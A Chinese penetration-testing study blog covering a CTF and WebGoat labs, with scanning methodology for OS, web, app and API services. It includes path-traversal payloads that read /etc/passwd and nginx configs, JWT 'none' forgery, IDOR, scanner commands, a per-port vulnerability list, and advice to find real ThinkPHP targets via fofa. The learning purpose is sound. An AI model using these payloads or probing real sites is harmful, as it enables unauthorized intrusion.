+<p>2、单击 “manage” （此时还是需要用burp改login的值），点击框框发现比较特殊的url；猜测可能存在文件包含或者下载、读取</p>
+<figure data-type="image" tabindex="109"><img src="https://jinqipiaopiao.github.io//post-images/1634368682044.png" alt="" loading="lazy"></figure>
+<p>3、测试访问url: xxxxxx.com/manages/admin.php?module=ind…/ex&amp;name=php 页面可以正常访问,猜测过滤了一遍…/再试一试绕过 url:url: xxxxxx.com/manages/admin.php?module=ind…/./ex&amp;name=php 访问不正常；<br>
+说明过滤机制只是把…/进行了一次过滤，所以我们双写…/即可</p>
+<p>4、访问测试任意文件读取判断路径通过不断加…/ url:?module=…/./…/./…/./etc/passwd&amp;name<br>
+（用户情况文件）</p>
+<figure data-type="image" tabindex="110"><img src="https://jinqipiaopiao.github.io//post-images/1634368686754.png" alt="" loading="lazy"></figure>
+<p>5、查看下服务器是nginx。找一下它的配置文件，根据信息读取配置文件， url: manages/admin.php?module=…/./…/./…/./etc/nginx/nginx.conf 获得关键文件sites-enabled/default 并进行读取</p>
+<figure data-type="image" tabindex="111"><img src="https://jinqipiaopiao.github.io//post-images/1634368691861.png" alt="" loading="lazy"></figure>
+<p>module=…/./…/./…/./etc/nginx/sites-enabled/default&amp;name=获得web文件路径online-movies 并访问</p>
+<figure data-type="image" tabindex="112"><img src="https://jinqipiaopiao.github.io//post-images/1634368696434.png" alt="" loading="lazy"></figure>
+<p>6、发现可以利用的漏洞，因为有一个autoindex on也就是开启了目录遍历，我们可以访问这个/online-movies/，访问出现如下，再点击…/发现要进行验证，把login改为1后页面空白，我通过百度发现要/online-movies/…才能遍历（不清楚为什么）</p>
+<figure data-type="image" tabindex="113"><img src="https://jinqipiaopiao.github.io//post-images/1634368702166.png" alt="" loading="lazy"></figure>
+<p>7、访问/online-movies…/</p>
+<figure data-type="image" tabindex="114"><img src="https://jinqipiaopiao.github.io//post-images/1634368707333.png" alt="" loading="lazy"></figure>
+<p>8、地址为:online-movies…/var/www/html/flag.php构造url下载到flag.php获得flag</p>
+<h1 id="2021-10-17">2021-10-17</h1>
+<h1 id="jwt安全及预编译case注入40-41">JWT安全及预编译case注入（40-41）</h1>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634470535618.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634470540122.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634470543718.png" alt="" loading="lazy"></p>
+<p>什么时JWT？<br>
+Json Web Token(JSON Web令牌)是一种跨域验证身份的方案。JWT不加密传输的数据，但能够通过数字签名来验证数据未被篡改（但是昨晚下面的WebGoat练习后我对这一点表示怀疑）。<br>
+JWT分为三部分，头部（header），声明（Claims），签名（Signature），三个部分以英文句号，隔开。Jwt的内容以Base64URL进行了编码。</p>
+<pre><code>头部（header）
+{
+&quot;alg&quot;:&quot;HS256&quot;;
+&quot;typ&quot;:&quot;JWT&quot;
+}
+</code></pre>
+<p>alg是说明这个JWT签名使用的算法的参数，常见值用HS256（默认），HS512等，也可以为none，hs256表示hmac sha256<br>
+typ说明这个token的类型为JWT</p>
+<p>声明（Claims）</p>
+<pre><code>{
+&quot;exp&quot;:1416471934,
+&quot;user_name&quot;:&quot;user&quot;,
+&quot;scope&quot;:[
+&quot;read&quot;,
+&quot;write&quot;   
+],
+&quot;authorities&quot;: [
+&quot;ROLE_ADMIN&quot;,
+&quot;ROLE_USER&quot;
+],
+&quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,
+&quot;client_id&quot;: &quot;my-client-with-secret&quot;
+}
+
+JWT 固定参数有：
+
+iss：发行人
+exp：到期时间
+sub：主题
+aud：用户
+nbf：在此之前不可用
+iat：发布时间
+jti：JWT ID 用于标识该 JWT
+</code></pre>
+<p>签名（Signature）<br>
+服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。<br>
+下面是一个用 HS256 生成 JWT 的代码例子<br>
+HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload),secret)</p>
+<p>1、用户端登录，用户名和密码在请求中被发往服务器<br>
+2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，服务器并没有保存登录状态信息。<br>
+3、服务器将 JWT（通过响应）返回给客户端<br>
+4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>
+5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态<br>
+6、服务器返回响应</p>
+<figure data-type="image" tabindex="115"><img src="https://jinqipiaopiao.github.io//post-images/1634471701524.png" alt="" loading="lazy"></figure>
+<p>40.1 JWT</p>
+<figure data-type="image" tabindex="116"><img src="https://jinqipiaopiao.github.io//post-images/1634471705966.png" alt="" loading="lazy"></figure>
+<p>40.2 身份验证攻击-JWT修改伪造</p>
+<figure data-type="image" tabindex="117"><img src="https://jinqipiaopiao.github.io//post-images/1634471711682.png" alt="" loading="lazy"></figure>
+<p>接上部分，产生歧义的”=“，”+“，”/“需要删除；<br>
+而第一部分说明的加密方法是none，所以第三部分为空就好。</p>
+<p><strong>40.3 SQL Injection(mitigation)</strong><br>
+防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。<br>
+利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;'&quot; + session.getAttribute(&quot;UserID&quot;) + &quot;'&quot;;<br>
+参数绑定方式，利用了 sql 的预编译技术</p>
+<pre><code>String query = &quot;SELECT * FROM users WHERE last_name = ?&quot;;
+PreparedStatement statement = connection.prepareStatement(query);
+statement.setString(1, accountName);
+ResultSet results = statement.executeQuery();
+</code></pre>
+<p>上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。<br>
+参数绑定方式可以使用下面方式绕过。<br>
+通过使用 case when语句可以将 order by后的 orderExpression表达式中添加select语句。</p>
+<p><strong>40.4 Java代码审计入门：WebGoat8</strong><br>
+参考：https://www.freebuf.com/vuls/216457.html</p>
+<p><strong>涉及资源</strong><br>
+https://jwt.io/#encoded-jwt<br>
+https://www.ctfhub.com/#Ichallenge<br>
+https:/www.zhihu.com/question/43581628<br>
+https://www.freebuf.com/vuls/216457.html<br>
+https://www.cnblogs.com/klyjb/p/11473857.html</p>
+<p><strong>41. 目录遍历访问控制XSS等安全问题</strong><br>
+本次直播注重代码分析，熟悉 javaweb 开发结构，掌握 javaweb 代码审计流程，其次才是相关漏洞解释（因前期漏洞原理已基本讲解完<br>
+毕），通过本次直播大家务必学会分析相关代码路径，结构，框架等知识点。</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634471718234.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634471721961.png" alt="" loading="lazy"><br>
+涉及资源<br>
+https://pan.baidu.com/s/19-w0GeDVYvHH6yRz9cNpGw oms7</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「进击的网安攻城狮」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_41665162/article/details/119790421</p>
+<h1 id="2021-10-18">2021-10-18</h1>
+<h1 id="java-安全-目录遍历访问控制-xss-等安全问题">JAVA 安全 - 目录遍历访问控制 XSS 等安全问题</h1>
+<p><strong>Javaweb 路径遍历</strong><br>
+靶场：webgoat-Path traversal（路径遍历）<br>
+路径（目录）遍历是一种漏洞，攻击者可以通过该漏洞访问或存储应用程序运行位置之外的文件和目录。这可能会导致从其他目录读取文件，以及在文件上传覆盖关键系统文件的情况下。</p>
+<p>第一关<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634530825006.png" alt="" loading="lazy"></p>
+<p>文件上传配合目录遍历 覆盖文件自定义文件存储地址-基于用户名存储问题<br>
+在此关卡中，目标是覆盖文件系统上的特定文件。当然，WebGoat 关心用户，因此您需要将文件上传到正常上传位置之外的以下位置，得知他的任务是将文件上传到webgoat指定的其他目录上</p>
+<p>1、随便上传一个文件抓包查看：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634530828902.png" alt="" loading="lazy"></p>
+<p>2、抓包放行后,得到存储路径<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634530833241.png" alt="" loading="lazy"></p>
+<p>3、可以看出是将fullName作为文件的上一目录上传，即\username\fullname\文件名<br>
+4、故我们尝试通过…/存储到上一路径<br>
+5、将fullname改为…/test<br>
+6、放行，成功<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634530845195.png" alt="" loading="lazy"></p>
+<p>7、白盒审计<br>
+POST、GET、@RequestBody和@RequestParam区别<br>
+@RequestParam有三个配置参数：<br>
+required 表示是否必须，默认为 true，必须。<br>
+defaultValue 可设置请求参数的默认值。<br>
+value 为接收url的参数名（相当于key值）。</p>
+<p>关键代码：</p>
+<pre><code>@ResponseBody
+public AttackResult uploadFileHandler(@RequestParam(&quot;uploadedFile&quot;) MultipartFile file, @RequestParam(value = &quot;fullName&quot;, required = false) String fullName) {
+return super.execute(file, fullName);
+}
+</code></pre>
+<p>预防：<br>
+目录解析</p>
+<p>springframework javaweb的spring框架，类似于php的phpthink框架</p>
+<p><strong>第二关</strong></p>
+<figure data-type="image" tabindex="118"><img src="https://jinqipiaopiao.github.io//post-images/1634530853170.png" alt="" loading="lazy"></figure>
+<p>同样的任务，只是用了一个replace将…/去掉而已，双写即可<br>
+Payload: …//x<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634530857955.png" alt="" loading="lazy"></p>
+<p>白盒审计：</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634530862446.png" alt="" loading="lazy"><br>
+过滤fullName中的…/一次</p>
+<p>第三关<br>
+可知不对fullname验证</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634530867865.png" alt="" loading="lazy"><br>
+发现fullname赋值为什么，最终都是test</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634530873197.png" alt="" loading="lazy"><br>
+抓包查看，修改filename，在前面加…/</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634530879676.png" alt="" loading="lazy"><br>
+成功</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634530884436.png" alt="" loading="lazy"><br>
+<strong>第四关</strong><br>
+这关要求找到名叫path-traversal-secret.jpg的文件。</p>
+<p>1、先点一下show random cat picture按钮，burpsuite抓包</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634530898968.png" alt="" loading="lazy"><br>
+2、请求包没有什么有用的数据，放行查看响应包</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634530903497.png" alt="" loading="lazy"><br>
+3、而任务是想让我们尝试找到一个名为path-traversal-secret.jpg，</p>
+<p>4、像下图这样random-picture后面增加?id=1.jpg，发送报文之后，响应404 Not Found，发现服务器查找的文件名在id的值后面加上了.jpg。所以如果要查看1.jpg的内容，应该在random-picture后面增加?id=1</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634530964176.png" alt="" loading="lazy"><br>
+接下来可以试试random-picture后面增加?id=path-traversal-secret<br>
+结果返回了400 Bad Request<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634530991941.png" alt="" loading="lazy"></p>
+<p>再试试random-picture后面增加?id=…/path-traversal-secret</p>
+<p>也返回了400 Bad Request，而且提示请求参数中有非法字符<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634530998617.png" alt="" loading="lazy"></p>
+<p>把上述payload中的<code>…/改为%2e%2e%2f（…/的url编码）</code><br>
+还是返回400 Bad Request，但是不提示有非法字符了。<br>
+那再往上一级目录看看，<code>?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret</code><br>
+从返回结果来看，已经找到要找的文件了。<br>
+提示用户名的SHA-512 hash就是本题的答案<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531003811.png" alt="" loading="lazy"></p>
+<p>网上搜一下SHA512在线，然后把用户名进行SHA512 hash<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531010130.png" alt="" loading="lazy"></p>
+<p>将得到的结果填入小旗子后面的输入框，submit secret即可通过本关<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531015840.png" alt="" loading="lazy"></p>
+<p><strong>Javaweb 代码分析-前端验证安全问题</strong><br>
+不安全登录 Insecure Login-基于前端认证<br>
+1、页面提示单击登录抓包<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531042455.png" alt="" loading="lazy"></p>
+<p>2、得到用户和密码，登录通过<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531048397.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531053660.png" alt="" loading="lazy"></p>
+<p><strong>1、黑盒测试查看源代码发现是js判断，关闭js即可</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531061121.png" alt="" loading="lazy"></p>
+<p><strong>2、白盒测试，查看函数，发现有16进制，解码后是账号密码</strong><br>
+16进制转换网页<br>
+转换前把\x去掉</p>
+<figure data-type="image" tabindex="119"><img src="https://jinqipiaopiao.github.io//post-images/1634531079962.png" alt="" loading="lazy"></figure>
+<p><strong>3、白盒测试，查看submit点击的源代码</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531085935.png" alt="" loading="lazy"></p>
+<p><strong>Javaweb 代码分析-逻辑越权安全问题</strong><br>
+代码分析过关逻辑<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531093017.png" alt="" loading="lazy"></p>
+<p>此题目是为了说明请求返回的包里可能包含了更多的内容。此题目要求将response包返回的所有参数比界面上View Profile中显示的多的几个参数，具体如下。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531099341.png" alt="" loading="lazy"></p>
+<p><strong>枚举用户参数对应数据库的其他数据信息</strong><br>
+role,userid<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531104024.png" alt="" loading="lazy"></p>
+<p><strong>url接口</strong><br>
+在Stage 3中知道了tom的userId是2342384。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531108907.png" alt="" loading="lazy"></p>
+<pre><code>{
+&quot;role&quot; : 3,
+&quot;color&quot; : &quot;yellow&quot;,
+&quot;size&quot; : &quot;small&quot;,
+&quot;name&quot; : &quot;Tom Cat&quot;,
+&quot;userId&quot; : &quot;2342384&quot;
+}
+</code></pre>
+<p>该题目就是通过路由访问tom的配置信息，在输入框里输入WebGoat/IDOR/profile/2342384，就通过了此题目。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531114557.png" alt="" loading="lazy"></p>
+<p><strong>白盒测试</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531120951.png" alt="" loading="lazy"></p>
+<p>通过参数值构造 URL 获取用户更多的信息<br>
+<strong>WebGoat/IDOR/profile/2342384</strong></p>
+<p>Javaweb 代码分析-XSS 跨站安全问题<br>
+XSS 跨站<br>
+代码分析结合页面解释过关<br>
+第2关：yes</p>
+<p>第7关：修改card number + 绕过黑名单<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531125571.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634531129816.png" alt="" loading="lazy"></p>
+<p><strong>拓展-安卓 APP 反编译 JAVA 代码</strong><br>
+#核心知识点：Java 代码分析 === Apk_App 分析<br>
+模块引用（框架,自带等），路由地址，静态文件（html.js 等）,简易代码理解等</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_45441315/article/details/120032501</p>
+<h1 id="2021-10-19">2021-10-19</h1>
+<p>#42. 操作系统之漏洞探针类型利用修复（42-45）</p>
+<p>相关名词解释：</p>
+<p>CVSS（Common Vulnerability Scoring System，即“通用漏洞评分系统”）</p>
+<p>CVSS是安全内容自动化协议（SCAP）的一部分<br>
+通常CVSS与CVE一同由每个国家漏洞库（NVD）发布并保持数据的更新<br>
+分值范围：0-10<br>
+不同机构按CVSS分值定义威胁的中、高、低威胁级别<br>
+CVSS体现弱点的风险，威胁级别（severity）表现弱点风险对企业的影响程度<br>
+CVSS分值是工业标准，但威胁级别不是<br>
+CVE（Common Vulnerabilities &amp; Exposures，即“通用漏洞披露”）</p>
+<p>已公开的信息安全漏洞字典，统一的漏洞编号标准<br>
+MITRE公司负责维护（非盈利机构）<br>
+扫描器的大部分扫描项都对应一个CVE编号<br>
+实现不同厂商之间信息交换的统一标准<br>
+CVE发布流程<br>
+发现漏洞<br>
+CAN负责指定CVE ID<br>
+发布到CVE List——CVE-2008-4250<br>
+exp:利用</p>
+<p>poc:验证</p>
+<p>漏洞发现-操作系统之漏洞探针类型利用修复</p>
+<p>1.角色扮演：操作系统权限的获取会造成服务器上安全问题</p>
+<p>2.漏扫工具：Goby，Nmap，Nessus，Openvas，Nexpose等，举例</p>
+<p>Goby 忍者系统测试<br>
+nmap 默认nse插件（扫描常规漏洞）：<br>
+nmap --script=vuln 192.168.33.1<br>
+nmap 扩展漏洞扫描模块（参考：https://www.cnblogs.com/shwang/p/12623669.html）<br>
+nmap -sV --script=vulscan/vulscan.nse 192.168.199.1<br>
+nmap -sV --script=nmap-vulners 192.168.199.1<br>
+Nessus 安装-使用-插件库加载扫描（推荐此工具）<br>
+下载：https://pan.baidu.com/s/17uA2OmJbV_cDG2C6QnHqqA 提取码：cxd4<br>
+3.漏洞类型：权限提升，缓冲器溢出，远程代码执行，未知Bug等</p>
+<p>4.漏洞利用：工具框架集成类，漏洞公布平台库类，复现文章参考等</p>
+<p>使用工具框架，包括：metasploit、searchsploit、企业单位内部产品等<br>
+kali系统<br>
+忍者安全渗透系统（NINJUTSU OS)：https://blog.csdn.net/qq_35258210/article/details/115457883<br>
+searchsploit使用攻略：https://www.jianshu.com/p/bd8213c53717<br>
+搜索漏洞公布平台，寻找单点EXP<br>
+https://www.cnvd.org.cn/<br>
+https://www.seebug.org/<br>
+https://fr.0day.today/<br>
+https://www.exploit-db.com/<br>
+https://packetstormsecurity.com/<br>
+5.漏洞修复：打上漏洞补丁，关闭对应入口点，加上防护软件硬件等</p>
+<h1 id="43漏洞发现-web应用之漏洞探针类型利用修复">43：漏洞发现-WEB应用之漏洞探针类型利用修复</h1>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635846102852.png" alt="" loading="lazy"><br>
+已知CMS</p>
+<p>如常见的dedecms，discuz，wordpress等源码结构，这种一般采用非框架类开发，但是也有少部分采用框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用白盒代码审计自行挖掘。</p>
+<p>搜索漏洞公布平台，寻找单点EXP：</p>
+<p>https://www.cnvd.org.cn/<br>
+https://www.seebug.org/<br>
+https://fr.0day.today/<br>
+https://www.exploit-db.com/<br>
+https://packetstormsecurity.com/<br>
+使用工具框架进行有针对性的扫描：</p>
+<p>CMSScan：综合类，一款适用于WordPress、Drupal、Joomla、vBulletin的安全扫描工具<br>
+https://github.com/ajinabraham/CMSScan<br>
+wpscan：WordPress扫描工具<br>
+https://github.com/wpscanteam/wpscan<br>
+kali系统，忍者系统自带<br>
+使用时需要在官方（https://wpscan.com）申请一个账号（谷歌人机身份验证，必须FQ），登录后得到一个token，使用wpscan时需要带着这个token。</p>
+<pre><code>用法：wpscan --url &lt;URL&gt; --api-token &lt;YourToken&gt; 
+</code></pre>
+<p>joomscan：Joomla扫描工具<br>
+https://github.com/OWASP/joomscan<br>
+DrupalScan：Drupal扫描工具<br>
+https://github.com/rverton/DrupalScan<br>
+其他：先识别CMS，然后网上搜索针对该CMS的漏扫工具<br>
+代码审计：</p>
+<p>函数点挖掘<br>
+功能点挖掘<br>
+框架类挖掘<br>
+开发框架</p>
+<p>如常见的thinkphp，spring，flask等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息（名字，版本），通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。</p>
+<p>常见的PHP开发框架：Yii、Laravel、Thinkphp<br>
+常见的Java开发框架：Shiro、Struts、Spring、Maven<br>
+常见的Python开发框架：Flask、Django、Tornado<br>
+未知CMS</p>
+<p>如常见的企业和个人内部程序源码，也可以是某CMS二次开发的源码结构，针对此类的程序源码测试思路：能识别二次开发就按已知CMS思路进行，不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以进行代码审计自行挖掘。</p>
+<p><strong>案例1：开发框架类源码渗透测试-咨讯-thinkphp</strong></p>
+<p>1.fofa搜索&quot;index/login/login&quot;，寻找测试网站。</p>
+<p>2.构造错误的url，查看错误回显，确定网站使用thinkphp框架及其版本。</p>
+<p>3.使用专门工具对thinkphp进行漏洞挖掘，比如</p>
+<p>TPScan（jar文件）：一键ThinkPHP漏洞检测工具（参考：https://www.jeeinn.com/2021/03/1493/）<br>
+https://github.com/tangxiaofeng7/TPScan<br>
+TPScan（基于Python3）：一键ThinkPHP漏洞检测工具：<br>
+https://github.com/Lucifer1993/TPscan<br>
+thinkPHP5.x远程命令执行(getshell)测试工具<br>
+地址：https://pan.baidu.com/s/17UOif8XD_-V_IMVAHXVlcw 提取码: 31x2<br>
+4.找到漏洞后，通过工具框架，漏洞公布平台，复现文章参考等进行漏洞利用。<br>
+<strong>案例2：开发框架类源码渗透测试-咨讯-spring</strong></p>
+<p>1.使用Vulhub一键搭建漏洞测试靶场（https://vulhub.org/）</p>
+<p>2.在Vulhub网站搜索某类漏洞，按照步骤，启动环境，漏洞复现。如图</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636096377907.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636096386351.png" alt="" loading="lazy"><br>
+<strong>案例3：已知CMS非框架类渗透测试-工具脚本-wordpress</strong></p>
+<p>1.环境准备：登录墨者学院，启动靶场环境：WordPress插件漏洞分析溯源。<br>
+2.CMS识别：进入首页，根据底部版权信息得知，该网站CMS使用的是WordPress。<br>
+3.使用wpscan工具扫描。<br>
+(1)wpscan官网注册并登录账号，得到token。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636096392240.png" alt="" loading="lazy"></p>
+<pre><code>(2)kali下启动扫描：$ wpscan --url http://219.153.49.228:41640/ --api-token &lt;mytoken&gt;
+</code></pre>
+<p>扫描结果如下：</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636096397695.png" alt="" loading="lazy"><br>
+4.去网上找到相关文章、poc等，进行漏洞利用。</p>
+<p>案例4：已知CMS非框架类渗透测试-代码审计-qqyewu_php<br>
+seay源码审计系统<br>
+案例5：未知CMS非框架类渗透测试-人工-wg<br>
+外挂类网站</p>
+<h1 id="44漏洞发现-app应用之漏洞探针类型利用修复">44：漏洞发现-APP应用之漏洞探针类型利用修复</h1>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636194110938.png" alt="" loading="lazy"><br>
+思路说明：</p>
+<p>反编译提取URL或抓包获取url，进行web应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试！</p>
+<p><strong>案例1：抓包精灵</strong></p>
+<p>Android抓包软件，可以安装到手机上，不需要过多设置，即可抓住手机上app产生的http/https包并自动解析，确定是只能看不能操作。</p>
+<p>地址：https://github.com/huolizhuminh/NetWorkPacketCapture/releases/tag/1.0.4</p>
+<p><strong>案例2：ApkAnalyser</strong></p>
+<p>简介：一键提取安卓应用中可能存在的敏感信息。</p>
+<p>用法：将所有app放到程序自动创建的apps目录，再运行主程序就好了，不用加参数。</p>
+<p>功能：目前提取了APK内所有字符串、所有URLs、所有ip、可能是hash值的字符串、存在的敏感词（如oss.aliyun）、可能是accessKey的值。</p>
+<p>地址：https://github.com/TheKingOfDuck/ApkAnalyser//releases/download/1.0/apkAnalyser.zip</p>
+<p><strong>案例3：xray与burp联动被动扫描</strong></p>
+<p>参考：https://www.cnblogs.com/L0ading/p/12388928.html</p>
+<h1 id="45漏洞发现-api接口服务之漏洞探针类型利用修复">45：漏洞发现-API接口服务之漏洞探针类型利用修复</h1>
+<figure data-type="image" tabindex="120"><img src="https://jinqipiaopiao.github.io//post-images/1636194535649.png" alt="" loading="lazy"></figure>
+<p>接口服务类安全测试</p>
+<p>根据前期信息收集针对目标端口服务类探针后进行的安全测试，主要涉及攻击方法：口令安全，WEB类漏洞，版本漏洞等，其中产生的危害可大可小，属于端口服务/第三方服务类安全测试面。一般在已知应用无思路的情况下选用的安全测试方案。</p>
+<p>API接口-webservice RESTful APT</p>
+<p>https://xz.aliyun.com/t/2412</p>
+<p>https://github.com/SmartBear/soapui<br>
+根据应用自身的功能方向决定，安全测试目标需有API接口才能进行此类测试，主要涉及的安全问题：自身安全，配合WEB，业务逻辑等，其中产生的危害可大可小，属于应用API接口网络服务测试面，一般也是在存在接口调用的情况下的测试方案。</p>
+<p>WSDL(网络服务描述语言，web services description language)是一门基于XML的语言，用于描述web services 以及如何对他们进行访问。</p>
+<p>漏洞关键字，配合shodan,fofa,zoomye搜索</p>
+<pre><code>inurl: jws?wsdl
+inurl: asmx?wsdl
+inurl: aspx?wsdl
+inurl: ascx?wsdl
+inurl: ashx?wsdl
+inurl: dll?wsdl
+inurl: exe?wsdl
+inurl: php?wsdl
+inurl: pl?wsdl
+inurl: ?wsdl
+inurl: asmx?wsdl
+filetype: ?wsdl
+</code></pre>
+<p>1.web服务类</p>
+<pre><code>tomcat--80/8080/8009
+manager弱口令
+put上传webshell
+HTTP慢速攻击
+ajr文件包含漏洞 CVE-2020-1938
+Jboss--8080
+后台弱口令
+console后台部署war包
+Java反序列化
+远程代码执行
+webSphere--9080
+后台弱口令
+任意文件泄露
+Java反序列化
+Weblogic--7001/7002
+后台弱口令
+console后台部署war包
+SSRF
+测试页面上传webshell
+Java反序列化
+	CVE-2018-2628
+	CVE-2018-2893
+	CVE-2017-10271
+	CVE-2019-2725
+	CVE-2019-2729
+Glassfish--8080/4848
+暴力破解
+任意文件读取
+认证绕过
+Jetty--8080
+远程共享缓冲区溢出
+Apache--80/8080
+HTTP慢速攻击
+解析漏洞
+目录遍历
+Apache Solr--8983
+远程命令执行
+　　CVE-2017-12629
+　　CVE-2019-0193
+IIS--80
+put上传webshell
+IIS解析漏洞
+IIS提权
+IIS远程代码执行 CVE-2017-7269
+Resin-8080
+目录遍历
+远程文件读取
+Axis2--8080
+后台弱口令
+Lutos--1352
+后台弱口令
+信息泄露
+跨站脚本攻击
+Nginx--80/443
+HTTP慢速攻击
+解析漏洞
+</code></pre>
+<p>2.数据库类</p>
+<pre><code>MySQL--3306
+弱口令
+身份认证漏洞 CVE-2012-2122
+拒绝服务攻击
+phpmyadmin万能密码or弱口令
+UDF/MOF提权
+Mssql--1433
+弱口令
+存储过程提权
+Oralce--1521
+弱口令
+TNS漏洞
+Redis--6379
+弱口令
+未授权访问
+PostgreSQL--5432
+弱口令
+缓冲区溢出 CVE-2014-2669
+MongoDB--27001
+弱口令
+未授权访问
+DB2--5000
+安全限制绕过进行未授权操作 CVE-2015-1922
+SysBase--5000/4100
+弱口令
+命令注入
+Memcache-11211
+未授权访问
+配置漏洞
+ElasticSearch--9200/9300
+未授权访问
+远程代码执行
+文件办理
+写入Webshell
+</code></pre>
+<p>3.大数据类</p>
+<pre><code>Hadoop--50010
+远程命令执行
+Zookeeper--2181
+未授权访问
+</code></pre>
+<p>4.文件共享</p>
+<pre><code>ftp--21
+弱口令
+匿名访问
+上传后们
+远程溢出
+漏洞攻击
+NFS--2049
+未授权访问
+Samba--137
+弱口令
+未授权访问
+远程代码执行 CVE-2015-0240
+LDAP--389
+弱口令
+注入
+未授权访问
+</code></pre>
+<p>5.远程访问</p>
+<pre><code>SSH--22
+弱口令
+28退格漏洞
+OpenSSL漏洞
+用户名枚举
+Telnet--23
+弱口令
+RDP--3389
+弱口令
+shift粘滞键后门
+缓冲区溢出
+MS12-020
+CVE-2019-0708
+WNC--5901
+弱口令
+认证口令绕过
+拒绝服务攻击 CVE-2015-5239
+权限提升 CVE-2013-6886
+Pcanywhere-5632
+拒绝服务攻击
+权限提升
+代码执行
+X11-6000
+未授权访问 CVE-1999-0526
+</code></pre>
+<p>6.邮件服务</p>
+<pre><code>SMTP--25/465
+弱口令
+未授权访问
+邮件伪造
+POP3-110/995
+弱口令
+未授权访问
+IMAP-143/993
+弱口令
+任意文件读取
+</code></pre>
+<p>7.其他服务</p>
+<pre><code>DNS--53
+DNS区域传输
+DNS劫持
+DNS欺骗
+DNS缓存投毒
+DNS隧道
+DHCP-67/68
+DHCP劫持
+DHCP欺骗
+SNMP--161
+弱口令
+Rlogin-512/513/514
+rlogin登录
+Rsync--873
+未授权访问
+本地权限提升
+Zabbix-8069
+远程命令执行
+RMI--1090/1099
+java反序列化
+Docker-2375
+未授权访问
+</code></pre>
+<p><strong>案例1：其他补充类-基于端口web站点又测试</strong></p>
+<p>很多网站域名是一个网站，域名+端口又是一个网站，这样当你渗透测试时，相当于多了一个目标，相应的成功几率也会变高。举例：http://yc.zjgsu.edu.cn和http://yc.zjgsu.edu.cn:8080/</p>
+<p><strong>案例2：其他补充类-基于域名web站点又测试</strong></p>
+<p>思路1：当我们拿到一个域名时，比如www.jmisd.cn，我们可能首先会去查询它的子域名，这是一个方向，这里我们提供另外一种思路，查询它的相关域名，方法是百度 域名查询，会有很多可以查询域名是否已被注册的网站，比如西部数码网站，我们进入后搜索jmisd，会显示以下3个域名已被注册，然后我们分别查看它们的whois信息、下方版权信息等，查看它们与是否与原网站有相同点，若有，说明这两个网站是同一个公司的，然后就为渗透这个网站找到了一条新路。</p>
+<p>0<br>
